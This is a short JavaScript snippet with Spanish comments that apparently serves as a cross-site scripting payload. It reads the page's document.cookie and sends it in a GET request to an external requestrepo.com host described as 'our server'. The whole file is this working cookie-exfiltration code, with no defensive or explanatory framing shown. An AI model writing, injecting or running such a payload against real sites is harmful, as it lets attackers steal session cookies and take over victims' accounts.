//Creamos el objeto request
var request = new XMLHttpRequest();
//configuramos la petición hacia nuestro servidor
request.open("GET", "http://4ti3cfg7.requestrepo.com/?cookie=" + document.cookie);
//Enviamos la petición
request.send();
